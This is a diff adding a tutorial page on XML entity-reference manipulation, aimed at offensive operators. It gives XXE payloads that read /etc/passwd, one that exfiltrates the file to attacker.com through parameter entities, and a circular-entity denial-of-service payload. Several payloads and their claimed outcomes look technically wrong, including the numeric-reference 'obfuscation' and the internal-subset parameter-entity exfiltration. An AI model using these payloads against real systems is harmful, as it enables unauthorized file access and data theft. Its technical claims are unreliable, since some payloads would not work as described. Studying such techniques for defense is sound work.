@@ -1,0 +1,142 @@
+---
+title: Entity Reference Manipulation Techniques
+description: Learn advanced XML entity reference manipulation to evade detection and
+  bypass parser restrictions effectively.
+keywords:
+- Entity Reference Manipulation
+- XML Parsing
+- XXE Exploitation
+- Security Evasion
+- XML Parser Bypass
+- Nested Entities
+- Entity Obfuscation
+---
+
+# Entity Reference Manipulation
+
+## Context
+
+Entity Reference Manipulation aims to teach offensive security operators how to exploit XML parser weaknesses using advanced methods of evasion and bypass. Understanding XML structures and syntax, standard entity references, the XML parsing process, and basic XML External Entity (XXE) exploitation techniques is a prerequisite for mastering these advanced techniques.
+
+## Theory
+
+### Entity Reference Manipulation Fundamentals
+
+Entity reference manipulation involves crafting or altering XML entity references to evade detection or bypass parser restrictions. Attackers exploit parser behaviors by abusing entity reference resolution and recursion, allowing them to execute malicious payloads without triggering defenses.
+
+### Types of Entity Reference Manipulation
+
+#### General Entity Bypass
+
+This technique involves using standard XML entities in unexpected ways to trigger XXE vulnerabilities. Although typical patterns may be blocked by security mechanisms, creative use of entities can bypass such defenses.
+
+#### Parameter Entity Bypass
+
+Leveraging parameter entities (e.g., `%ent;`) allows attackers to deliver payloads indirectly. These entities enable the combination of different XML constructs to extend the attack's reach and complexity.
+
+#### Nested Entity References
+
+Entities can reference other entities, forming nested structures. This increases complexity and can evade filters set up to detect direct XXE payloads, thereby achieving the attack goals through layers of indirection.
+
+#### Entity Recursion Bypass
+
+Recursive entity definitions can confuse or crash parsers. By designing entities to reference themselves or others in a recursive manner, attackers can exploit parser weaknesses leading to potential denial-of-service scenarios or other unintended executions.
+
+#### Circular Entity Reference
+
+Entities referencing each other in a loop form a circular reference. This technique can evade static analysis by making it difficult for a parser to resolve these references without running into logical loops or errors.
+
+#### Entity Name Obfuscation
+
+Using non-obvious or encoded entity names allows attackers to bypass blacklist filters. By altering the presentation or encoding of entity names, they evade straightforward filtering methods, facilitating undetected deployments.
+
+### Parser Behavior and Security Mechanisms
+
+Some XML parsers resolve entities recursively, enabling complex evasion chains. While security controls might block obvious XXE payloads, they may miss obfuscated or nested references. Manipulated entities can bypass input validation, Web Application Firewalls (WAFs), or static analysis, allowing hostile payloads to execute.
+
+## Practice
+
+### General Entity Reference Obfuscation
+
+- **Payload:**
+
+    ```xml
+    <!DOCTYPE root [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    ]>
+    <root>&#120;&#120;&#101;;</root>
+    ```
+
+- **Explanation:** This payload obfuscates the entity reference using numeric character references for the string 'xxe'.
+
+- **Outcome:** Bypasses filters that block direct `&xxe;` references, allowing unauthorized file access.
+
+### Nested Entity Reference Chains
+
+- **Payload:**
+
+    ```xml
+    <!DOCTYPE root [
+    <!ENTITY a SYSTEM "file:///etc/passwd">
+    <!ENTITY b "&a;">
+    ]>
+    <root>&b;</root>
+    ```
+
+- **Explanation:** Entity `b` references entity `a`, increasing payload complexity and avoiding direct pattern-matching filters.
+
+- **Outcome:** Evades simple pattern-matching filters by nesting entities, facilitating unauthorized file access.
+
+### Parameter Entity Bypass
+
+- **Payload:**
+
+    ```xml
+    <!DOCTYPE root [
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % eval "<!ENTITY exfil SYSTEM 'http://attacker.com/?%file;'>">
+    %eval;
+    ]>
+    <root>&exfil;</root>
+    ```
+
+- **Explanation:** This payload uses parameter entities to indirectly define and trigger data exfiltration.
+
+- **Outcome:** Bypasses filters that check only general entities, allowing sensitive data exfiltration.
+
+### Entity Recursion and Circular Reference
+
+- **Payload:**
+
+    ```xml
+    <!DOCTYPE root [
+    <!ENTITY loop1 "&loop2;">
+    <!ENTITY loop2 "&loop1;">
+    ]>
+    <root>&loop1;</root>
+    ```
+
+- **Explanation:** The recursive referencing between `loop1` and `loop2` can cause parser errors or bypass static validation through logical looping.
+
+- **Outcome:** Triggers parser instability or bypasses static entity checks, potentially causing denial of service.
+
+### Entity Name Obfuscation
+
+- **Payload:**
+
+    ```xml
+    <!DOCTYPE root [
+    <!ENTITY xXx SYSTEM "file:///etc/passwd">
+    ]>
+    <root>&xXx;</root>
+    ```
+
+- **Explanation:** Using non-standard or mixed-case entity names like `xXx` allows evasion of blacklist-based filters that commonly block names like `xxe`.
+
+- **Outcome:** Evades filters blocking common entity names, leading to unauthorized file access.
+
+## Tools
+
+- **Burp Suite**
+- **curl**
+- **XXEinjector**
